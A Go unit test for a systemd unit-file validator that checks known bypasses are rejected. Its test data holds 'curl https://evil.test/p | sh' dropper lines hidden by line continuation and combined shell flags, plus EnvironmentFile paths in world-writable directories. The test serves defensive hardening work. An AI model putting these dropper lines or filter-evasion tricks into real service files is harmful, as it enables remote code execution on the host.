package service

import (
	"errors"
	"testing"
)

// TestUnitContent_BypassRegressions pins the unit-content dropper/injection
// bypasses CodeRabbit surfaced on the hardening change — each must be REJECTED,
// and legitimate units must still pass.
func TestUnitContent_BypassRegressions(t *testing.T) {
	rejected := map[string]string{
		// CRITICAL: a backslash line-continuation splits the dropper so neither
		// physical line trips the per-line check.
		"line-continuation shell dropper": "[Service]\nExecStart=/bin/sh \\\n  -c 'curl https://evil.test/p | sh'\n",
		// MINOR: -c hidden inside a combined short-option cluster.
		"combined -ec shell flag": "[Service]\nExecStart=/bin/bash -ec 'curl https://evil.test/p | sh'\n",
		"combined -xc shell flag": "[Service]\nExecStart=/usr/bin/sh -xc 'id'\n",
		// MAJOR: EnvironmentFile indirection into a world-writable path the
		// attacker controls (it can carry LD_PRELOAD).
		"EnvironmentFile world-writable":             "[Service]\nEnvironmentFile=/tmp/evil.env\nExecStart=/usr/bin/true\n",
		"EnvironmentFile ignore-missing dev-shm":     "[Service]\nEnvironmentFile=-/dev/shm/x.env\nExecStart=/usr/bin/true\n",
		"line-continuation EnvironmentFile dev-shm":  "[Service]\nEnvironmentFile= \\\n /var/tmp/x.env\nExecStart=/usr/bin/true\n",
		"escaped backslash is not a continuation /1": "[Service]\nExecStart=/bin/sh -c 'echo hi'\\\\\n", // trailing \\ = literal, line stands alone → sh -c rejected
	}
	for name, content := range rejected {
		t.Run("reject/"+name, func(t *testing.T) {
			if err := validateUnitContent(content); !errors.Is(err, ErrUnsafeUnitContent) {
				t.Errorf("validateUnitContent accepted a known bypass; err = %v\ncontent:\n%s", err, content)
			}
		})
	}

	allowed := []string{
		"[Service]\nExecStart=/usr/bin/myservice --flag value\n",
		"[Service]\nEnvironmentFile=/etc/myservice.env\nExecStart=/usr/bin/myservice\n", // root-owned env file is the operator's choice
		"[Service]\nExecStart=/usr/bin/foo \\\n  --bar baz\n",                           // a benign continuation of a non-shell exe
		"[Service]\nEnvironment=FOO=bar BAZ=qux\nExecStart=/usr/bin/myservice\n",
	}
	for i, content := range allowed {
		t.Run("allow/"+string(rune('a'+i)), func(t *testing.T) {
			if err := validateUnitContent(content); err != nil {
				t.Errorf("validateUnitContent rejected a legitimate unit: %v\ncontent:\n%s", err, content)
			}
		})
	}
}
